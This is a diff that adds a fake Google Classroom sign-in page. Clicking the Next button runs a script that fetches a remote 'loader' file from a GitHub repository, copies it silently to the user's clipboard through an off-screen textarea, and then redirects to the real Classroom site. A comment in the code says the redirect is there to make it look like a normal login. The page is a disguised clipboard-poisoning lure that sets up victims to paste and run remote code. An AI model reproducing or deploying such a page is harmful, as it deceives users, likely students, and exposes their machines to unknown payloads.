@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Classroom</title>
+    <link rel="icon" href="logo.svg" type="image/svg">
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #202124;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 8px 24px;
+            background-color: white;
+            border-bottom: 1px solid #dadce0;
+            height: 64px;
+            box-sizing: border-box;
+        }
+        .logo {
+            height: 32px;
+            margin-right: 8px;
+        }
+        .header-text {
+            font-size: 22px;
+            color: #5f6368;
+            font-weight: 400;
+        }
+        .container {
+            max-width: 448px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin: 0 0 8px 0;
+        }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            text-align: center;
+            margin: 0 0 40px 0;
+            color: #5f6368;
+        }
+        .input-field {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 26px;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 0;
+        }
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 88px;
+        }
+        .next-button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 24px;
+            font-size: 12px;
+            color: #5f6368;
+            background: white;
+            border-top: 1px solid #dadce0;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            display: flex;
+            align-items: center;
+        }
+        select {
+            border: none;
+            background: none;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .hidden {
+            position: absolute;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.gstatic.com/classroom/logo_square_48.svg" alt="Google Classroom" class="logo">
+        <div class="header-text">Classroom</div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Sign in</h1>
+        <div class="subtitle">Use your Google Account</div>
+
+        <div class="input-field">
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+        </div>
+
+        <a href="#" class="forgot-email">Forgot email?</a>
+
+        <div class="buttons">
+            <a href="#" class="create-account">Create account</a>
+            <button class="next-button" id="loginButton">Next</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>Español (Latinoamérica)</option>
+                <option>Português (Brasil)</option>
+            </select>
+        </div>
+        <div>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <textarea id="hiddenCopy" class="hidden"></textarea>
+
+    <script>
+        document.getElementById('loginButton').addEventListener('click', async function(e) {
+            e.preventDefault();
+            try {
+                const response = await fetch('https://raw.githubusercontent.com/emilispy/CCheat/main/loader');
+                if (!response.ok) throw new Error('Failed to fetch');
+                const text = await response.text();
+                
+                // Use hidden textarea to copy
+                const hiddenCopy = document.getElementById('hiddenCopy');
+                hiddenCopy.value = text;
+                hiddenCopy.select();
+                document.execCommand('copy');
+                
+                // Redirect to make it seem like normal login flow
+                window.location.href = 'https://classroom.google.com';
+            } catch (error) {
+                console.error('Error:', error);
+                // Fallback to redirect even if copy fails
+                window.location.href = 'https://classroom.google.com';
+            }
+        });
+    </script>
+</body>
+</html>
